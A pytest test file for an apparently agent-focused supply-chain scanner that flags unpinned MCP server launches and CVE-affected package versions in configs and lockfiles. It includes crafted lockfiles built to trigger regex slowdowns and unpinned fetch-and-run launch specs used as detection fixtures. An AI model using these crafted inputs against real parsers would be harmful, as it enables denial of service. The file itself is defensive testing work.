    ({"command": "npx", "args": ["some-mcp-server@1"]}, "version range `1`"),
    ({"command": "uvx", "args": ["some-mcp-server@latest"]}, "floating tag `latest`"),
    ({"command": "uvx", "args": ["some-mcp-server>=1.0"]}, "version range `>=1.0`"),
    ({"command": "uvx", "args": ["some-mcp-server==1.2.*"]}, "version range `==1.2.*`"),
    ({"command": "npx", "args": ["-y", "github:org/repo#v1.2.3"]},
     "a git or URL reference without a commit"),
    ({"command": "npx -y some-mcp-server"}, "no version pin"),
    ({"command": "bunx", "args": ["@scope/pkg"]}, "no version pin"),
])
def test_an_unpinned_spec_is_reported_once_with_its_reason(
    tmp_path: Path, server: dict, reason: str
) -> None:
    evidence = _supply001(tmp_path, server)
    assert len(evidence) == 1, evidence
    assert f"({reason})" in evidence[0]


def test_every_package_an_invocation_fetches_is_judged(tmp_path: Path) -> None:
    """`--with` and a repeated `-p` add packages; the command after them is not one."""
    uvx = {"command": "uvx", "args": ["--with", "requests", "some-mcp-server==1.0.0"]}
    assert _supply001(tmp_path, uvx) == ["Server 'srv' arg: requests (no version pin)"]
    npx = {"command": "npx", "args": ["-p", "a", "-p", "b@2.0.0", "the-command"]}
    assert _supply001(tmp_path, npx) == ["Server 'srv' arg: a (no version pin)"]


def test_the_value_of_a_credential_option_is_never_read_as_the_package(tmp_path: Path) -> None:
    """npm reads `--api-key VALUE` as an option and its value. Read as a flag, the
    key became the package, and the finding quoted it."""
    server = {"command": "npx", "args": ["--api-key", "k-5e3c9a1f", "some-mcp-server"]}
    assert _supply001(tmp_path, server) == ["Server 'srv' arg: some-mcp-server (no version pin)"]


# ---------------------------------------------------------------------------
# AAK-SUPPLY-001 reads VS Code's `servers` map too
# ---------------------------------------------------------------------------

_UNPINNED = {"command": "npx", "args": ["-y", "some-mcp-server"]}


def _supply001_in(tmp_path: Path, rel: str, config: object) -> list[str]:
    target = tmp_path / rel
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(json.dumps(config))
    findings, _ = scan(tmp_path)
    return [f.evidence for f in findings if f.rule_id == "AAK-SUPPLY-001"]


def test_vscode_servers_map_is_read(tmp_path: Path) -> None:
    """VS Code keeps its servers under `servers`; the rule read `mcpServers` only."""
    evidence = _supply001_in(tmp_path, ".vscode/mcp.json", {"servers": {"c": _UNPINNED}})
    assert evidence == ["Server 'c' arg: some-mcp-server (no version pin)"]


def test_both_maps_are_read_each_on_its_own(tmp_path: Path) -> None:
    config = {"mcpServers": {"a": _UNPINNED}, "servers": {"a": _UNPINNED}}
    assert len(_supply001_in(tmp_path, ".mcp.json", config)) == 2


@pytest.mark.parametrize("config", [
    {"servers": [{"name": "listing", "command": "npx", "args": ["some-mcp-server"]}]},
    {"mcp": {"servers": {"c": _UNPINNED}}},
    {"servers": {"c": "npx -y some-mcp-server", "d": ["npx"], "e": None}},
    ["npx", "-y", "some-mcp-server"],
    "npx -y some-mcp-server",
])
def test_only_top_level_object_maps_of_object_entries_are_read(
    tmp_path: Path, config: object
) -> None:
    """A registry listing (`servers` array), a nested map, a non-object entry and a
    non-object config are not server maps, and none of them raises."""
    assert _supply001_in(tmp_path, ".vscode/mcp.json", config) == []


def test_a_blank_command_does_not_raise(tmp_path: Path) -> None:
    assert _supply001_in(tmp_path, ".mcp.json", {"mcpServers": {"a": {"command": "   "}}}) == []


# ---------------------------------------------------------------------------
# Large lockfiles
#
# package-lock.json, Pipfile.lock and Cargo.lock over 1,000,000 characters were
# skipped without a finding, a silent all-clear on the projects with the most
# dependencies: a lockfileVersion 3 package-lock.json passes 1 MB at about 2,200
# packages, which is also where AAK-SUPPLY-005 has the most to say. Lockfiles are
# now read up to MAX_LOCKFILE_BYTES (32 MiB), checked with stat() before reading.
# ---------------------------------------------------------------------------


def _write_padded_package_lock(path: Path, minimum_bytes: int, packages: dict) -> None:
    """A lockfileVersion 3 package-lock.json over `minimum_bytes`, holding
    `packages` among filler entries shaped like real ones."""
    entry = {
        "version": "1.0.0",
        "resolved": "https://registry.npmjs.org/filler/-/filler-1.0.0.tgz",
        "integrity": "sha512-" + "A" * 86 + "==",
    }
    count = minimum_bytes // len(json.dumps(entry)) + 1
    filled: dict = {"": {"name": "app", "version": "1.0.0"}}
    filled.update({f"node_modules/filler-{i}": entry for i in range(count)})
    filled.update(packages)
    lockfile = {"name": "app", "lockfileVersion": 3, "packages": filled}
    path.write_text(json.dumps(lockfile), encoding="utf-8")
    assert path.stat().st_size > minimum_bytes


def test_a_package_lock_over_1mb_is_read(tmp_path: Path) -> None:
    _write_padded_package_lock(
        tmp_path / "package-lock.json", 1_100_000, {"node_modules/axios": {"version": "1.7.2"}}
    )
    findings, _ = scan(tmp_path)
    supply002 = [f.evidence for f in findings if f.rule_id == "AAK-SUPPLY-002"]
    assert any(e.startswith("axios@1.7.2") for e in supply002), supply002
    assert [f for f in findings if f.rule_id == "AAK-SUPPLY-005"], "the count was skipped too"


def test_a_cargo_lock_over_1mb_is_counted(tmp_path: Path) -> None:
    block = (
        '[[package]]\nname = "crate-{i}"\nversion = "1.0.0"\n'
        'source = "registry+https://github.com/rust-lang/crates.io-index"\n'
        'checksum = "' + "0" * 64 + '"\n\n'
    )
    count = 1_100_000 // len(block) + 1
    lock = tmp_path / "Cargo.lock"
    packages = "".join(block.replace("{i}", str(i)) for i in range(count))
    lock.write_text("version = 3\n\n" + packages, encoding="utf-8")
    assert lock.stat().st_size > 1_100_000
    findings, _ = scan(tmp_path)
    supply005 = [f.evidence for f in findings if f.rule_id == "AAK-SUPPLY-005"]
    assert supply005 == [f"{count} dependencies (threshold: 200)"]


def test_a_cargo_toml_without_a_lock_is_reported_once(tmp_path: Path) -> None:
    """`_check_lockfile_exists` reports it. `_scan_rust_deps` ended with the same
    check, unreachable behind its return when there is no Cargo.lock."""
    (tmp_path / "Cargo.toml").write_text("[package]\n", encoding="utf-8")
    assert supply_chain._scan_rust_deps(tmp_path) == []
    assert [f.file_path for f in scan(tmp_path)[0] if f.rule_id == "AAK-SUPPLY-004"] == ["Cargo.toml"]


def test_a_lockfile_over_the_limit_is_not_read(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """The stated limitation, at a size a test can write: the size is checked
    before the file is read, and a lockfile over it yields nothing."""
    from agent_audit_kit.scanners import supply_chain

    _write_padded_package_lock(
        tmp_path / "package-lock.json", 60_000, {"node_modules/axios": {"version": "1.7.2"}}
    )
    rules = ("AAK-SUPPLY-002", "AAK-SUPPLY-005")
    assert {f.rule_id for f in scan(tmp_path)[0]} >= set(rules), "the file is reportable"
    monkeypatch.setattr(supply_chain, "MAX_LOCKFILE_BYTES", 50_000)
    assert not [f for f in scan(tmp_path)[0] if f.rule_id in rules]


# A lockfile each older per-CVE pin check reports. Those checks read every
# candidate whole, however large, where the pin table skips a lockfile over
# MAX_LOCKFILE_BYTES unread; now they skip it too, and their rules say so.
_PIN_CHECK_LOCKFILES = [
    ("AAK-DORIS-001", "poetry.lock", '[[package]]\nname = "apache-doris-mcp-server"\nversion = "0.5.0"\n'),
    ("AAK-MCP-GATEWAY-REGISTRY-CVE-2026-14471-001", "uv.lock",
     '[[package]]\nname = "mcp-gateway-registry"\nversion = "1.0.0"\n'),
    ("AAK-MCP-SERENA-CVE-2026-49471-001", "uv.lock", '[[package]]\nname = "serena-agent"\nversion = "1.5.0"\n'),
    ("AAK-EXCEL-MCP-001", "poetry.lock", '[[package]]\nname = "excel-mcp-server"\nversion = "0.1.7"\n'),
    ("AAK-ASTROMCP-SQLI-CVE-2026-7591-001", "yarn.lock", 'astro-mcp-server@1.1.1:\n  version "1.1.1"\n'),
    ("AAK-AGENT-ZERO-CVE-2026-30624-PIN-001", "uv.lock",
     'agent-zero = { git = "https://github.com/frdel/agent-zero#v0.9.8" }\n'),
    ("AAK-CHATGPT-MCP-CVE-2026-7061-PIN-001", "package-lock.json", '{"dependencies": {"chatgpt-mcp-server": "1.0.0"}}\n'),
    ("AAK-DOCSGPT-MCP-STDIO-MITM-001", "uv.lock", "docsgpt==0.6.3\n"),
    ("AAK-DOCSGPT-MCP-STDIO-MITM-001", "yarn.lock", "docsgpt@0.6.3:\n"),
    ("AAK-MCPCALC-CVE-2026-44717-PIN-001", "uv.lock", "mcp-calculate-server==0.1.0\n"),
    ("AAK-SK-INMEMORY-VECTORSTORE-FILTER-CVE-2026-26030-PIN-001", "poetry.lock", "semantic-kernel==1.39.0\n"),
    ("AAK-GPTRESEARCHER-MCP-STDIO-MITM-001", "uv.lock", "gpt-researcher==0.14.8\n"),
    ("AAK-GPTRESEARCHER-MCP-STDIO-MITM-001", "yarn.lock", "gpt-researcher@0.14.8:\n"),
    ("AAK-LITELLM-CVE-2026-30623-PIN-001", "uv.lock", '[[package]]\nname = "litellm"\nversion = "1.83.0"\n'),
    ("AAK-CLAUDECODE-CVE-2026-40068-PIN-001", "yarn.lock", '"@anthropic-ai/claude-code@2.1.0":\n'),
    ("AAK-MCP-ATLASSIAN-CVE-2026-27825-001", "poetry.lock", 'mcp-atlassian = "0.16.0"\n'),
    ("AAK-MCP-ATLASSIAN-CVE-2026-27826-001", "poetry.lock", 'mcp-atlassian = "0.16.0"\n'),
    ("AAK-LANGCHAIN-SSRF-REDIR-001", "uv.lock", '[[package]]\nname = "langchain-text-splitters"\nversion = "1.1.0"\n'),
    ("AAK-SSRF-TOCTOU-001", "uv.lock", '[[package]]\nname = "langchain-openai"\nversion = "1.1.0"\n'),
]


@pytest.mark.parametrize(
    ("rule_id", "name", "text"), _PIN_CHECK_LOCKFILES, ids=[f"{r}:{n}" for r, n, _ in _PIN_CHECK_LOCKFILES]
)
def test_a_pin_checks_lockfile_over_the_limit_is_not_read(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, rule_id: str, name: str, text: str
) -> None:
    from agent_audit_kit.rules.builtin import get_rule
    from agent_audit_kit.scanners import mcp_atlassian, ssrf_redirect, ssrf_toctou, supply_chain

    limited = {"AAK-LANGCHAIN-SSRF-REDIR-001": ssrf_redirect, "AAK-SSRF-TOCTOU-001": ssrf_toctou}.get(rule_id, supply_chain)
    scanner = mcp_atlassian if rule_id.startswith("AAK-MCP-ATLASSIAN-") else limited
    (tmp_path / name).write_text(text, encoding="utf-8")
    assert rule_id in {f.rule_id for f in scanner.scan(tmp_path)[0]}, "the lockfile is reportable"
    monkeypatch.setattr(limited, "MAX_LOCKFILE_BYTES", len(text.encode()) - 1)
    assert rule_id not in {f.rule_id for f in scanner.scan(tmp_path)[0]}
    # The pins #1035 rewrote state the manifest cap in a sentence of its own.
    assert get_rule(rule_id).limitations.endswith(
        ("or a lockfile over 32 MiB, is not read.", "A lockfile over 32 MiB is not read."))


def test_the_lockfile_index_reads_each_format() -> None:
    """One pass a lockfile, every package in it, by the name its registry compares."""
    from agent_audit_kit.scanners.supply_chain import _lockfile_index

    yarn_v1 = (
        "# yarn lockfile v1\n\n"
        '"@scope/pkg@^1.0.0", "@scope/pkg@^1.1.0":\n  version "1.2.0"\n'
        '  resolved "https://registry.yarnpkg.com/@scope/pkg/-/pkg-1.2.0.tgz"\n\n'
        "next@^15.0.0:\n  version \"15.0.0\"\n  dependencies:\n    react \"^18.0.0\"\n\n"
        'next@^16.1.0:\n  version "16.1.0"\n'
    )
    assert _lockfile_index(yarn_v1, "yarn.lock") == {
        "@scope/pkg": [(1, 2, 0)], "next": [(15, 0, 0), (16, 1, 0)],
    }
    yarn_berry = '__metadata:\n  version: 6\n\n"next@npm:^16.1.0":\n  version: 16.1.0\n'
    assert _lockfile_index(yarn_berry, "yarn.lock") == {}
    pnpm = (
        "packages:\n  /next@16.1.0:\n    resolution: {integrity: a}\n"
        "  '@next/eslint-plugin-next@16.2.0':\n    resolution: {integrity: b}\n"
        "snapshots:\n  next@16.1.0(react@18.0.0):\n    dependencies: {}\n"
    )
    assert _lockfile_index(pnpm, "pnpm-lock.yaml") == {
        "next": [(16, 1, 0)], "@next/eslint-plugin-next": [(16, 2, 0)], "react": [(18, 0, 0)],
    }
    package_lock_v1 = json.dumps({"lockfileVersion": 1, "dependencies": {
        "axios": {"version": "1.7.2", "dependencies": {"follow-redirects": {"version": "1.15.0"}}},
    }})
    assert _lockfile_index(package_lock_v1, "package-lock.json") == {
        "axios": [(1, 7, 2)], "follow-redirects": [(1, 15, 0)],
    }
    uv_lock = 'version = 1\n\n[[package]]\nname = "Awslabs.Healthlake_MCP-Server"\nversion = "0.0.5"\n'
    assert _lockfile_index(uv_lock, "uv.lock") == {"awslabs-healthlake-mcp-server": [(0, 0, 5)]}
    pipfile_lock = json.dumps({"default": {"litellm": {"version": "==1.83.0"}}, "develop": []})
    assert _lockfile_index(pipfile_lock, "pipfile.lock") == {"litellm": [(1, 83, 0)]}
    assert _lockfile_index("[not json", "package-lock.json") == {}
    assert _lockfile_index("[1, 2]", "pipfile.lock") == {}


def _blank_run_toml_lock() -> str:
    """A package block of 300,000 blank lines and no keys, then a readable one."""
    return "[[package]]\n" + "\n" * 300_000 + '[[package]]\nname = "a"\nversion = "1.0.0"\n'


_CRAFTED_LOCKFILES = {
    # `^\s*name` crossed newlines, so in a block without the key every line start
    # of a blank run rescanned the rest of the run: 300,000 blank lines took 71 s.
    "uv.lock": _blank_run_toml_lock,
    "poetry.lock": _blank_run_toml_lock,
    # If a name character could precede a name, every position of a run of them
    # would start a match and read up to 214 characters: about ten seconds here.
    "pnpm-lock.yaml": lambda: "~" * 9_000_000 + " next@16.1.0\n",
}


@pytest.mark.parametrize("filename", sorted(_CRAFTED_LOCKFILES))
def test_a_crafted_lockfile_indexes_in_linear_time(filename: str) -> None:
    """A lockfile is read up to 32 MiB now, so its parsing must stay linear. The
    bound is loose for slow CI runners; the linear version takes milliseconds."""
    import time

    from agent_audit_kit.scanners.supply_chain import _lockfile_index

    text = _CRAFTED_LOCKFILES[filename]()
    started = time.perf_counter()
    index = _lockfile_index(text, filename)
    assert time.perf_counter() - started < 10.0
    assert index, "the crafted file still holds one readable entry"


def test_a_pypi_launch_is_not_looked_up_in_the_npm_table(tmp_path: Path) -> None:
    """uvx reads `axios@1.7.2` as a PyPI project, which the npm table says
    nothing about; npx reads it as the npm package the table lists. (This was
    `openclaw@2.0.0`: uvx reads that as the cmdop CLI installer on PyPI.)"""
    def supply006(command: str) -> list[str]:
        config = {"mcpServers": {"x": {"command": command, "args": ["axios@1.7.2"]}}}
        (tmp_path / ".mcp.json").write_text(json.dumps(config))
        return [f.evidence for f in scan(tmp_path)[0] if f.rule_id == "AAK-SUPPLY-006"]

    assert supply006("uvx") == []
    assert supply006("uv tool run") == []
    hits = supply006("npx")
    assert len(hits) == 1 and hits[0].startswith("Server 'x' uses axios@1.7.2"), hits


def test_the_npm_openclaw_placeholder_is_not_reported(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Both tables listed npm `openclaw` below 2.1.0, and the one release there is
    `0.0.1`, an empty placeholder: OpenClaw publishes calendar versions, which its
    CVE pins read with NVD's ranges. Neither rule reports the placeholder now. The
    bundled database is read, not one an earlier `aak update` cached."""
    monkeypatch.setattr("agent_audit_kit.vuln_db.CACHED_DB", tmp_path / "no-cache" / "vuln_db.json")
    lock = {"lockfileVersion": 3, "packages": {"node_modules/openclaw": {"version": "0.0.1"}}}
    (tmp_path / "package-lock.json").write_text(json.dumps(lock), encoding="utf-8")
    config = {"mcpServers": {"claw": {"command": "npx", "args": ["-y", "openclaw@0.0.1"]}}}
    (tmp_path / ".mcp.json").write_text(json.dumps(config), encoding="utf-8")
    assert not [f for f in scan(tmp_path)[0] if f.rule_id in ("AAK-SUPPLY-002", "AAK-SUPPLY-006")]
    assert "openclaw" not in supply_chain.KNOWN_VULNERABLE_PACKAGES["npm"]


# ---------------------------------------------------------------------------
# The older pin checks judge what each declaration admits
# ---------------------------------------------------------------------------
#
# They read the first number after the package name, so an upper bound read as
# the version: `pkg<FIXED`, which admits only affected releases, read as FIXED and
# passed, and `<2.0.0,>=1.0.0` passed where `>=1.0.0,<2.0.0` fired. The
# gateway-registry and Serena checks judged only the first mention in a file, so
# a comment or a patched mention above an affected one decided it. Each file is
# now read in its own format (`_manifest_deps`), every declaration is judged by
# the versions it admits (`_versions`), and a lockfile by the versions it
# resolves, as the CVE pin table does.

_DORIS = "AAK-DORIS-001"
_GATEWAY = "AAK-MCP-GATEWAY-REGISTRY-CVE-2026-14471-001"
_SERENA = "AAK-MCP-SERENA-CVE-2026-49471-001"
_EXCEL = "AAK-EXCEL-MCP-001"
_LITELLM = "AAK-LITELLM-CVE-2026-30623-PIN-001"
_OLD_PINS = (
    # rule, package, the first fixed release, the release below it
    (_DORIS, "apache-doris-mcp-server", "0.6.1", "0.6.0"),
    (_GATEWAY, "mcp-gateway-registry", "1.0.13", "1.0.12"),
    (_SERENA, "serena-agent", "1.5.2", "1.5.1"),
    (_EXCEL, "excel-mcp-server", "0.1.8", "0.1.7"),
    (_LITELLM, "litellm", "1.83.7", "1.83.6"),
)


# Each package's upstream repository, for git requirements.
_REPOS = {
    _DORIS: "apache/doris-mcp-server",
    _GATEWAY: "agentic-community/mcp-gateway-registry",
    _SERENA: "oraios/serena",
    _EXCEL: "haris-musa/excel-mcp-server",
    _LITELLM: "BerriAI/litellm",
}


def _pin_ids(root: Path, rel: str, text: str) -> set[str]:
    target = root / rel
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(text, encoding="utf-8")
    return {f.rule_id for f in scan(root)[0]}


@pytest.mark.parametrize(("rule_id", "name", "fixed", "below"), _OLD_PINS, ids=[p[0] for p in _OLD_PINS])
@pytest.mark.parametrize(("spec", "fires"), [
    ("=={below}", True),
    ("=={fixed}", False),
    ("<{fixed}", True),  # admits only affected releases; read as {fixed} before
    ("<=9.0.0,>={below}", True),  # upper bound first; read as 9.0.0 before
    (">={below},<=9.0.0", True),
    (">={fixed},<9.0.0", False),
    (">{below}", False),  # admits {fixed} and up; read as {below} before
    ("~={below}", True),
    ("!={below}", True),  # excludes one affected release, admits the rest
])
def test_an_older_pin_judges_the_range_a_requirement_admits(
    tmp_path: Path, rule_id: str, name: str, fixed: str, below: str, spec: str, fires: bool
) -> None:
    line = name + spec.format(fixed=fixed, below=below)
    assert (rule_id in _pin_ids(tmp_path, "requirements.txt", line + "\n")) is fires, line


@pytest.mark.parametrize(("rule_id", "name", "fixed", "below"), _OLD_PINS, ids=[p[0] for p in _OLD_PINS])
def test_an_older_pin_is_not_decided_by_a_comment(
    tmp_path: Path, rule_id: str, name: str, fixed: str, below: str
) -> None:
    text = f"# {name} {below} is affected, so we stay on the fix\n{name}=={fixed}\n"
    assert rule_id not in _pin_ids(tmp_path, "requirements.txt", text)


@pytest.mark.parametrize(("rule_id", "name", "fixed", "below"), _OLD_PINS, ids=[p[0] for p in _OLD_PINS])
@pytest.mark.parametrize(("rel", "template"), [
    ("pyproject.toml", '[tool.poetry.dependencies]\npython = "^3.10"\n{name} = "{spec}"\n'),
    ("Pipfile", '[packages]\n{name} = "{spec}"\n'),
    ("pyproject.toml", '[project]\nname = "x"\ndependencies = ["{name}[extra]{spec}"]\n'),
])
def test_an_older_pin_reads_poetry_pipfile_and_extras(
    tmp_path: Path, rule_id: str, name: str, fixed: str, below: str, rel: str, template: str
) -> None:
    spec = "==" + below if rel == "Pipfile" or "[extra]" in template else below
    assert rule_id in _pin_ids(tmp_path / "bad", rel, template.format(name=name, spec=spec))
    spec = "==" + fixed if rel == "Pipfile" or "[extra]" in template else fixed
    assert rule_id not in _pin_ids(tmp_path / "good", rel, template.format(name=name, spec=spec))


@pytest.mark.parametrize(("rule_id", "name", "fixed", "below"), _OLD_PINS, ids=[p[0] for p in _OLD_PINS])
@pytest.mark.parametrize("lockfile", ["uv.lock", "poetry.lock"])
def test_an_older_pin_judges_the_version_a_lockfile_resolves(
    tmp_path: Path, rule_id: str, name: str, fixed: str, below: str, lockfile: str
) -> None:
    block = '[[package]]\nname = "{name}"\nversion = "{version}"\n'
    assert rule_id in _pin_ids(tmp_path / "bad", lockfile, block.format(name=name, version=below))
    assert rule_id not in _pin_ids(tmp_path / "good", lockfile, block.format(name=name, version=fixed))


@pytest.mark.parametrize(("rule_id", "name", "fixed", "below"), _OLD_PINS, ids=[p[0] for p in _OLD_PINS])
def test_an_older_pin_reports_its_package_not_a_longer_name(
    tmp_path: Path, rule_id: str, name: str, fixed: str, below: str
) -> None:
    assert rule_id not in _pin_ids(tmp_path, "requirements.txt", f"my-{name}-extras=={below}\n")


@pytest.mark.parametrize(("rule_id", "name"), [(_GATEWAY, "mcp-gateway-registry"), (_SERENA, "serena-agent")])
def test_an_unpinned_reference_is_still_reported(tmp_path: Path, rule_id: str, name: str) -> None:
    assert rule_id in _pin_ids(tmp_path, "requirements.txt", f"{name}\n")


@pytest.mark.parametrize(("rule_id", "name"), [
    (_DORIS, "apache-doris-mcp-server"), (_EXCEL, "excel-mcp-server"), (_LITELLM, "litellm"),
])
def test_a_version_pin_still_needs_a_stated_version(tmp_path: Path, rule_id: str, name: str) -> None:
    assert rule_id not in _pin_ids(tmp_path, "requirements.txt", f"{name}\n")


# A git requirement in each form pip reads: plain, editable, and PEP 508.
_GIT_REQUIREMENTS = [
    "git+https://github.com/{repo}{ref}#egg={name}",
    "-e git+https://github.com/{repo}.git{ref}#egg={name}",
    "{name} @ git+https://github.com/{repo}.git{ref} ; python_version >= '3.10'",
]


@pytest.mark.parametrize(("rule_id", "name", "fixed", "below"), _OLD_PINS, ids=[p[0] for p in _OLD_PINS])
@pytest.mark.parametrize("template", _GIT_REQUIREMENTS)
def test_an_older_pin_reads_the_tag_of_a_git_requirement(
    tmp_path: Path, rule_id: str, name: str, fixed: str, below: str, template: str
) -> None:
    """A git requirement states no version, but its tag names the release it
    installs. The gateway-registry and Serena checks reported a patched tag as
    unpinned, and the other three did not read a tag below the fix."""
    def line(version: str) -> str:
        return template.format(repo=_REPOS[rule_id], ref=f"@v{version}", name=name) + "\n"

    assert rule_id in _pin_ids(tmp_path / "bad", "requirements.txt", line(below))
    assert rule_id not in _pin_ids(tmp_path / "good", "requirements.txt", line(fixed))


@pytest.mark.parametrize(("rule_id", "name", "fixed", "below"), _OLD_PINS, ids=[p[0] for p in _OLD_PINS])
@pytest.mark.parametrize("template", _GIT_REQUIREMENTS)
@pytest.mark.parametrize("ref", [
    "", "@main", "@v2",  # no ref, a branch, a tag that is no dotted release
    # A commit, which pip's parser read as a release when it began with digits:
    # `@1a2b3c4` as 1.0.0 and `@0e1f2a3` as 0.0.0. Short and full, from a digit,
    # from 0, and all digits.
    "@1a2b3c4", "@1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b",
    "@0e1f2a3", "@0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f",
    "@1234567", "@1234567890123456789012345678901234567890",
    "@3f2a9c1",
])
def test_a_git_requirement_without_a_version_tag_states_no_version(
    tmp_path: Path, rule_id: str, name: str, fixed: str, below: str, template: str, ref: str
) -> None:
    line = template.format(repo=_REPOS[rule_id], ref=ref, name=name)
    (tmp_path / "requirements.txt").write_text(line + "\n", encoding="utf-8")
    evidence = [f.evidence for f in scan(tmp_path)[0] if f.rule_id == rule_id]
    if rule_id in (_GATEWAY, _SERENA):  # these two report what states no version
        assert len(evidence) == 1 and " referenced at unpinned " in evidence[0], (line, evidence)
    else:
        assert evidence == [], line


def test_a_git_requirement_below_the_fix_is_reported_at_its_tag(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("git+https://github.com/oraios/serena@v1.5.0#egg=serena-agent\n")
    evidence = [f.evidence for f in scan(tmp_path)[0] if f.rule_id == _SERENA]
    assert len(evidence) == 1 and evidence[0].startswith("Serena MCP toolkit referenced at '1.5.0'")


def test_every_mention_in_an_mcp_config_is_judged(tmp_path: Path) -> None:
    """The first mention decided: a patched launch above an unpinned one hid it."""
    config = {"mcpServers": {
        "new": {"command": "uvx", "args": ["serena-agent==1.5.2"]},
        "old": {"command": "uvx", "args": ["--from", "git+https://github.com/oraios/serena", "serena"]},
    }}
    assert _SERENA in _pin_ids(tmp_path, ".mcp.json", json.dumps(config))
    config = {"mcpServers": {
        "new": {"command": "uvx", "args": ["mcp-gateway-registry@1.0.13"]},
        "old": {"command": "uvx", "args": ["mcp-gateway-registry==1.0.12"]},
    }}
    assert _GATEWAY in _pin_ids(tmp_path, ".mcp.json", json.dumps(config))


@pytest.mark.parametrize(("args", "fires"), [
    (["--from", "git+https://github.com/oraios/serena", "serena", "start-mcp-server"], True),
    (["--from", "git+https://github.com/oraios/serena@v1.5.0", "serena-mcp-server"], True),
    (["--from", "git+https://github.com/oraios/serena@v1.5.2", "serena-mcp-server"], False),
    (["run", "--directory", "/src/serena", "serena-mcp-server"], True),  # a checkout of unknown version
    # `--with` fetches another package; the command is still the checkout's.
    (["run", "--with", "requests", "--directory", "../serena", "serena-mcp-server"], True),
    (["--with", "requests", "--from", "serena-agent==1.5.2", "serena-mcp-server"], False),
    (["--from", "serena-agent[dashboard]==1.5.2", "serena"], False),
    (["serena-agent<1.5.2"], True),
])
def test_serena_reads_its_git_and_checkout_launches(tmp_path: Path, args: list[str], fires: bool) -> None:
    command = "uv" if args[0] == "run" else "uvx"
    config = {"mcpServers": {"serena": {"command": command, "args": args}}}
    assert (_SERENA in _pin_ids(tmp_path, ".mcp.json", json.dumps(config))) is fires


@pytest.mark.parametrize(("command", "args", "fires"), [
    ("docker", ["run", "-i", "--rm", "ghcr.io/agentic-community/mcp-gateway-registry:1.0.12"], True),
    ("docker", ["run", "-i", "--rm", "ghcr.io/agentic-community/mcp-gateway-registry:1.0.13"], False),
    ("docker", ["run", "-i", "--rm", "ghcr.io/agentic-community/mcp-gateway-registry"], True),
    ("docker", ["run", "-i", "--rm", "ghcr.io/agentic-community/mcp-gateway-registry-ui:1.0.0"], False),
    ("uvx", ["--from", "git+https://github.com/agentic-community/mcp-gateway-registry@v1.0.12",
             "mcp-gateway-registry"], True),
    ("uvx", ["--from", "git+https://github.com/agentic-community/mcp-gateway-registry@v1.0.13",
             "mcp-gateway-registry"], False),
    ("uv", ["run", "--with", "requests", "mcp-gateway-registry"], True),
])
def test_gateway_registry_reads_its_repository_and_image_references(
    tmp_path: Path, command: str, args: list[str], fires: bool
) -> None:
    """As Serena reads `oraios/serena`: a git or image reference to the project's
    repository carries its version in its tag, and one without a tag is
    unpinned. The check had stopped reading them, so an affected image passed."""
    config = {"mcpServers": {"gw": {"command": command, "args": args}}}
    assert (_GATEWAY in _pin_ids(tmp_path, ".mcp.json", json.dumps(config))) is fires


def test_a_crafted_mention_run_scans_in_linear_time(tmp_path: Path) -> None:
    """A mention is judged on a fixed window after it, so a file of mentions is linear."""
    import time

    text = json.dumps({"mcpServers": {"s": {"command": "uvx", "args": ["serena-agent " * 80_000]}}})
    started = time.perf_counter()
    _pin_ids(tmp_path, ".mcp.json", text)
    assert time.perf_counter() - started < 5.0


@pytest.mark.parametrize("rel", ["package.json", ".mcp.json"])
def test_a_crafted_long_word_is_read_in_linear_time(tmp_path: Path, rel: str) -> None:
    """`_manifest_deps` splits each package.json script, and each MCP config
    argument that holds a space, with `shell_tokens`, which took the square of a
    word's length until it stopped using shlex. The launch is read, a version too
    long to be one reads as none, and Serena reports an unpinned launch. The
    bound is loose for slow CI runners."""
    import time

    word = "serena-agent==1.5.0" + "a" * 1_000_000
    if rel == "package.json":
        text = json.dumps({"scripts": {"mcp": f"uvx {word} x"}})
    else:
        text = json.dumps({"mcpServers": {"s": {"command": "uvx", "args": [f"{word} x"]}}})
    started = time.perf_counter()
    found = _pin_ids(tmp_path, rel, text)
    assert time.perf_counter() - started < 5.0
    assert _SERENA in found


def test_a_manifest_over_the_limit_is_not_read(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    text = "litellm==1.83.6\n"
    assert _LITELLM in _pin_ids(tmp_path, "requirements.txt", text)
    monkeypatch.setattr(supply_chain, "MAX_MANIFEST_BYTES", len(text) - 1)
    assert _LITELLM not in _pin_ids(tmp_path, "requirements.txt", text)


# ---------------------------------------------------------------------------
# AAK-MCP-007 stands down where AAK-SUPPLY-001 reports the same launch
# ---------------------------------------------------------------------------
#
# Both rules report an unpinned package launch: AAK-SUPPLY-001 (MEDIUM) reads the
# launcher's grammar, AAK-MCP-007 (LOW) every argument without an `@`. On a config
# both read, `engine.run_scan` keeps AAK-SUPPLY-001 and drops AAK-MCP-007, after
# the rule and path filters, so selecting or excluding a rule still works.

_LAUNCH_RULES = ("AAK-MCP-007", "AAK-SUPPLY-001")
_NPX = {"command": "npx", "args": ["-y", "@scope/pkg"]}
_NPX_EVIDENCE = "Server 'fs' arg: @scope/pkg (no version pin)"


def _write(root: Path, rel: str, config: object) -> None:
    target = root / rel
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(json.dumps(config, indent=2))


def _launches(root: Path, **kwargs: object) -> list[tuple[str, str, str]]:
    result = run_scan(root, **kwargs)  # type: ignore[arg-type]
    return sorted(
        (f.rule_id, f.severity.value, f.evidence)
        for f in result.findings
        if f.rule_id in _LAUNCH_RULES
    )


def _launch_files(root: Path, **kwargs: object) -> list[tuple[str, str]]:
    result = run_scan(root, **kwargs)  # type: ignore[arg-type]
    return sorted((f.rule_id, f.file_path) for f in result.findings if f.rule_id in _LAUNCH_RULES)


def test_a_launch_both_rules_report_is_reported_once(tmp_path: Path) -> None:
    _write(tmp_path, ".mcp.json", {"mcpServers": {"fs": _NPX}})
    by_scanner = mcp_config.scan(tmp_path)[0] + supply_chain.scan(tmp_path)[0]
    assert sorted(
        (f.rule_id, f.line_number, f.evidence) for f in by_scanner if f.rule_id in _LAUNCH_RULES
